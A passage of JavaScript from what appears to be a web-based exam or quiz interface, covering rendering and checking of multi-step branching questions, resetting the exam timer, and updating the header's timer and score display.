    h+='<button type="button" class="opt" data-i="'+i+'" aria-pressed="false"><span class="letter">'+String.fromCharCode(65+i)+'.</span><span>'+md(o.text)+'</span><span class="sel-mark"></span></button>';
  });
  h+='</div><div id="br-verdict-'+ex.id+'"></div><div class="step-actions">';
  h+='<button type="button" class="btn btn-amber" id="br-check-'+ex.id+'">'+(ex._step===ex.steps.length-1?'Check — final':'Check step')+'</button>';
  h+='<button type="button" class="btn hidden" id="br-cont-'+ex.id+'">Continue &#8594;</button></div>';
  holder.innerHTML=h;
  holder.querySelectorAll('.opt').forEach(function(btn){
    btn.addEventListener('click',function(){
      if(a._done)return;
      ex.steps[ex._step]._choice=parseInt(btn.getAttribute('data-i'),10);
      holder.querySelectorAll('.opt').forEach(function(b2){b2.classList.remove('selected');b2.setAttribute('aria-pressed','false');b2.querySelector('.sel-mark').textContent='';});
      btn.classList.add('selected');btn.setAttribute('aria-pressed','true');btn.querySelector('.sel-mark').textContent='✓ selected';
    });
  });
  $('br-check-'+ex.id).addEventListener('click',function(){
    if(ex.steps[ex._step]._choice===null)return;
    checkBranchStep(ex,root);
  });
  $('br-cont-'+ex.id).addEventListener('click',function(){
    ex._step++;
    var qb=$('q-block-'+ex.id);
    if(qb)qb.outerHTML=questionBlock(ex).replace('<section class="block bl-question"','<section id="q-block-'+ex.id+'" class="block bl-question"');
    renderBranchStep(ex,root);
    window.scrollTo({top:0,behavior:scrollBehavior()});
  });
}
function checkBranchStep(ex,root){
  var st=ex.steps[ex._step];
  st._done=true;
  var ok=(st._choice===st._corr);
  var v=$('br-verdict-'+ex.id);
  v.innerHTML='<div class="step-verdict" style="border-color:'+(ok?'var(--state-correct)':'var(--state-incorrect)')+'"><span style="font-weight:800;color:'+(ok?'var(--state-correct)':'var(--state-incorrect)')+'">'+(ok?'&#10004; Correct':'&#10007; Incorrect')+'</span><span class="muted small">'+md(st.options[st.correct])+'</span></div>';
  $('br-check-'+ex.id).disabled=true;
  root.querySelectorAll('#br-'+ex.id+' .opt').forEach(function(b){b.disabled=true;});
  if(ex._step<ex.steps.length-1){
    $('br-cont-'+ex.id).classList.remove('hidden');
  }else{
    doCheck(false);
  }
}

function startExam(){
  exam.attempt++;

  timer.state='IDLE';timer.remain=budget;timer.manualSec=0;timer.autoSec=0;timer.perLimit=0;timer.perRemain=0;pauseEnteredAt=0;

}

function renderHeaderTimer(){
  var el=$('hd-timer');if(!el)return;
  var txt,cls='';
  if(timer.state===STATE_RUN)txt='&#9654; RUNNING <span class="t">'+fmtClock(timer.remain)+'</span>';
  else if(timer.state===STATE_MAN){txt='&#9208; PAUSED — manual (press Resume) <span class="t">'+fmtClock(timer.remain)+'</span>';cls='st-paused';}
  else if(timer.state===STATE_AUTO){txt='&#9208; PAUSED — reviewing feedback (resumes on Next) <span class="t">'+fmtClock(timer.remain)+'</span>';cls='st-paused';}
  else if(timer.state===STATE_END)txt='&#9632; ENDED <span class="t">'+fmtClock(timer.remain)+'</span>';
  else txt='&#9679; READY <span class="t">'+fmtClock(timer.remain)+'</span>';
  el.className='hd-timer '+cls;
  el.innerHTML=txt;
  var pt=$('per-timer-'+(exam.list[exam.current]||{}).id);
  if(pt&&timer.perLimit>0)pt.textContent=fmtClock(timer.perRemain);
  var sc=$('hd-score');
  if(sc){
    var answered=Math.max(1,exam.graded);
    var pct=exam.graded>0?Math.round(exam.creditSum/exam.graded*100):0;
    sc.innerHTML='Score <span class="s">'+fmt1(exam.creditSum)+' / '+exam.graded+'</span> &nbsp;'+pct+'%';
  }
  var rb=$('btn-review');
